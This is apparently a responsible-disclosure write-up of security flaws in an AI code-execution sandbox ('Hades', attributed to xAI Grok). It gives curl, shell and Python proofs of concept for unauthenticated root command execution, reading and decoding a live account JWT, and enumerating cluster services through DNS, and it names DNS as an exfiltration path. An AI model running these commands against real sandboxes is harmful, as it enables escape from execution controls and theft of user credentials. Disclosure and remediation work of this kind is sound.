# Hades Sandbox — Security Findings & Proofs of Concept

> Part 2 of 2. Architecture context in [`02-architecture-and-isolation.md`](./02-architecture-and-isolation.md).

---

## Summary

| ID | Finding | Severity | Boundary |
|---|---|---|---|
| VULN-01 | Unauthenticated session creation → `uid=0` command execution on `127.0.0.1:4242` | **High** (Critical if 4242 is reachable off-box) | Local HTTP |
| VULN-02 | `xai-hades-styx exec` runs commands with no authorization check | **Medium** | Local utility |
| VULN-03 | `/etc/secrets/terminal.jwt` world-readable, live `LoggedIn` credential | **High** | Filesystem |
| VULN-04 | Session token lifetime (3600s) exceeds VM lifetime (~300s) by ~55 min | **Medium** | Design |
| VULN-05 | Secrets and internal topology exposed via environment | **Low** | Environment |
| VULN-06 | Cluster DNS resolution from guest discloses namespace/service topology | **Low** | Network |

VULN-01 and VULN-02 are the same primitive by two doors. VULN-03 + VULN-04 chain into a credential that outlives the sandbox that issued it.

**Not achieved:** host escape, cross-tenant data, cloud credentials, cluster API access. See §8.

---

## VULN-01 — Unauthenticated command execution via control-plane HTTP

**Severity:** High (Critical if `4242` is reachable beyond loopback)
**CVSS 3.1:** `AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = 8.4 — becomes 9.8 at `AV:N`
**Component:** `grok-computer-server` v0.2.24, `127.0.0.1:4242`

### Description

The Node/Express server exposes session management and tool invocation without any authentication. A session can be created by an unauthenticated local caller, and the resulting session id is sufficient to invoke the `bash` tool as `uid=0`. No token, cookie, header, or shared secret is validated on either call.

`GET /` returns `404` (`Cannot GET /`) but `GET /health` returns `{"status":"healthy","version":"0.2.24"}` — version disclosure on the same unauthenticated surface.

### PoC

```bash
# 1. health / version disclosure
curl -s http://127.0.0.1:4242/health
# {"status":"healthy","version":"0.2.24"}

# 2. create a session, unauthenticated
SID=$(curl -s -X POST http://127.0.0.1:4242/sessions/create \
      -H 'Content-Type: application/json' -d '{}' \
      | grep -oE '"id":"[^"]+"' | cut -d'"' -f4)
echo "$SID"

# 3. invoke bash, unauthenticated
curl -s -X POST "http://127.0.0.1:4242/sessions/$SID/tools/call" \
  -H 'Content-Type: application/json' \
  -d '{"tool":"bash","args":{"cmd":"id"}}'Impact
Full control of the workload: arbitrary read/write, process control, network access, credential theft (see VULN-03). Any local process — including a compromised dependency inside the guest — gets root without a token.

If 4242 is exposed beyond loopback, this is unauthenticated RCE for anyone who can reach the port, with no Grok account required.

Remediation
Require a per-session bearer token on /sessions/* and /tools/call.
Bind /health to a minimal response or require auth; version disclosure aids targeting.
If the port is ever published, front it with mTLS or a shared secret.
Status
4242 is closed on newer nodes. Rollout is partial — old nodes remain exploitable.

VULN-02 — Unauthenticated execution via xai-hades-styx
Severity: Medium
CVSS 3.1: AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H = 7.8
Component: /.hades-container-tools/xai-hades-styx

Description
styx is charon's client and ships in a world-readable directory. Its exec subcommand runs a command in the guest with no authorization check. The -- separator is required; without it the command is parsed as a flag.

Unlike the 4242 path, styx works on hardened nodes where 4242 is closed — it is the surviving primitive.

PoC
bash
/.hades-container-tools/xai-hades-styx exec -- id
Evidence
uid=0(root) gid=0(root) groups=0(root)
Boundary check — styx exec does not cross the VM:

$ /.hades-container-tools/xai-hades-styx exec -- hostname
hds-<redacted>
$ hostname
hds-<redacted>
Identical. styx exec is a second door into the same room, not a way out of it.

Impact
Same primitive as VULN-01 with a smaller blast radius: no version leak, no session object, no HTTP surface. Redundant where 4242 is open, load-bearing where it is closed.

Remediation
styx exec should validate a caller identity (peer uid, or a token in the session env) before executing. At minimum, drop privileges for exec when the caller is not root.

VULN-03 — World-readable live session credential
Severity: High
CVSS 3.1: AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N = 6.8
Component: /etc/secrets/terminal.jwt

Description
/etc/secrets/ is readable by any process in the guest. It contains terminal.jwt, an HS256 JWT that identifies the live account:

json
{"typ":"JWT","alg":"HS256"}
{"uid":"<uuid>","cid":"<uuid>","zdr":false,"email":"<redacted>",
 "sl":"LoggedIn","pt":"<uuid>","cl":false,"ctm":false,"cs":"Web",
 "exp":1794339028,"iat":1794335428}
sl: LoggedIn — this is an authenticated session identity, not an anonymous one. exp - iat = 3600.

HS256 is symmetric. If the signing key is reachable from anywhere in the guest — environment, /app, a config file, a bundled default — forging a token for an arbitrary uid is a signing operation, not an exploit.

PoC
bash
cat /etc/secrets/terminal.jwt
# both VULN-01 and VULN-02 read it with no check
xai-hades-styx cat /etc/secrets/terminal.jwt
Decode:

bash
python3 - <<'EOF'
import base64,json
t=open('/etc/secrets/terminal.jwt').read().strip()
h,p,_=t.split('.')
d=lambda x: base64.urlsafe_b64decode(x+'='*(-len(x)%4))
print(json.loads(d(h))); print(json.loads(d(p)))
EOF
Impact
Anyone with guest access exits with a working account credential. The token is accepted by backend origins (files.grok.com presented it as application/grpc). Because HS256, key recovery upgrades this from replay to forgery for arbitrary users.

Remediation
0400 on /etc/secrets/*, owned by the user that actually needs it.
Move to RS256/ES256 so the guest holds no signing material.
Scope the token to the artifact origin only; it currently carries full account identity (uid, email, LoggedIn) for a channel that only needs file access.
Revoke on VM destroy.
Status
Signing key not yet recovered. Off-box replay still under test.

VULN-04 — Token lifetime inverted against VM lifetime
Severity: Medium
CVSS 3.1: AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N = 4.4 (chains to VULN-03)
Component: Token issuance policy

Description
token lifetime (exp - iat)  = 3600s
observed VM lifetime        ≈  300s
The disposable component issues a credential with 12× its own lifetime. The sandbox is designed to evaporate in minutes; the credential it mints keeps working for roughly 55 minutes after the sandbox, and everything in it, is gone.

A stolen token therefore does not die with the sandbox. It survives in a detached state — long enough to be exfiltrated, stored, and replayed from an entirely different network, with no live VM to correlate against.

PoC
bash
python3 -c "
import base64,json
t=open('/etc/secrets/terminal.jwt').read().strip()
d=lambda x: base64.urlsafe_b64decode(x+'='*(-len(x)%4))
p=json.loads(d(t.split('.')[1]))
print('lifetime:', p['exp']-p['iat'], 'seconds')"
# lifetime: 3600

date -u; date -u -d @$(python3 -c "
import base64,json;t=open('/etc/secrets/terminal.jwt').read().strip()
d=lambda x: base64.urlsafe_b64decode(x+'='*(-len(x)%4))
print(json.loads(d(t.split('.')[1]))['exp'])")
Compare against observed VM teardown (~5 min).

Impact
Extends the useful window of any credential compromise by an order of magnitude and decouples it from the sandbox lifecycle. Combined with VULN-03 it is the difference between "read a token in a sandbox" and "hold a valid credential after the sandbox is destroyed."

Remediation
Bind token TTL to VM TTL, or
Revoke on destroy via a short-TTL denylist, or
Issue a refresh pair so the long-lived half lives outside the guest.
VULN-05 — Secrets and topology in environment
Severity: Low
CVSS 3.1: AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N = 3.3
Component: /proc/1/environ

Description
Environment is fully readable and contains service keys and internal URLs:

COINGECKO_PRO_API_KEY=hellofromgrok
POLYGON_API_KEY=hellofromgrok
COINGECKO_BASE_URL=http://coingecko-proxy.hades-openbar.svc.cluster.local/api/v3
APK_PROXY_URL=http://<ip>/apk
CARGO_REGISTRIES_INDEX_PROXY=sparse+http://<ip>/cargo/
FILES_SERVER_ENDPOINT=https://files.grok.com
CHROMIUM_FLAGS=--disable-software-rasterizer --disable-dev-shm-usage --no-sandbox
Both API keys are literally hellofromgrok — placeholders, not live secrets. --no-sandbox on Chromium is confirmed in production flags.

Impact
Topology disclosure (namespace, service names, proxy hosts) and, in production, real key material. --no-sandbox means a renderer compromise is not contained by Chromium's own sandbox — only by the VM.

Remediation
Real values in production, or drop the keys entirely where unused.
Strip internal *.svc.cluster.local names from guest env.
The VM is the real boundary, so --no-sandbox is defensible — but document it.
VULN-06 — Cluster DNS as a topology oracle
Severity: Low
CVSS 3.1: AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N = 3.3
Component: Resolver 172.16.0.3

Description
The guest resolver answers *.svc.cluster.local:

$ getent hosts kubernetes.default.svc.cluster.local
10.236.16.1   kubernetes.default.svc.cluster.local
Namespace hades-openbar is inferable from COINGECKO_BASE_URL. Cluster DNS provides a free enumeration channel for internal service names and ClusterIPs that are invisible from the public internet.

DNS also works when HTTP is filtered — a viable exfiltration channel via subdomain encoding.

Impact
Recon only. Enables targeting of internal services if HTTP reachability to ClusterIPs exists.

Remediation
Restrict the guest resolver to a forward-only zone (public names).
If DNS is intentionally open, treat it as an exfil path and monitor volume.
7. Chain analysis
unauth local caller
   └─> POST /sessions/create                      (VULN-01)
        └─> POST /sessions/:id/tools/call  bash   → uid=0
             ├─> cat /etc/secrets/terminal.jwt    (VULN-03)
             │    └─> 3600s validity vs 300s VM   (VULN-04)
             │         └─> off-box replay window
             └─> env + DNS topology               (VULN-05, VULN-06)
styx exec -- (VULN-02) is an alternate entry where VULN-01 is patched; everything downstream is identical.

8. Verified negatives
| | |
|---|---|
| **Target** | xAI Grok code-execution sandbox ("Hades") |
| **Component** | Guest VM, rootfs layout, control plane, network namespace |
| **Access model** | In-guest, `uid=0`, obtained via unauth control-plane (see Part 2) |
| **Class** | Architecture teardown / isolation assessment |
| **Prior art** | Supersedes the gVisor-era analysis; Hades has migrated to a microVM |
9. Remediation summary
Immediate

Auth on all /sessions/* and /tools/call.
0400 on /etc/secrets, owned by the consuming user.
Finish the 4242 rollout — partial state means old nodes stay exploitable.
Auth check in styx exec.
Short term
5. Token TTL ≤ VM TTL, plus revoke-on-destroy.
6. ES256 so no signing material sits in the guest.
7. Scope the token to the artifact origin.

Structural
8. Treat the guest as untrusted. Every local listener and utility needs its own authz, not reliance on "it's only loopback."
9. Consider dropping the guest off uid=0 with a tighter seccomp profile.
10. Add a host-side zeroing guarantee on work-disk reuse — one config change from the Cloudflare-class leak.

10. Disclosure
Reported to xAI via HackerOne (hackerone.com/x) and vulnerabilities@x.ai with subject Responsible Disclosure. Nothing published before triage. No customer data read. Timeline added on acknowledgement.
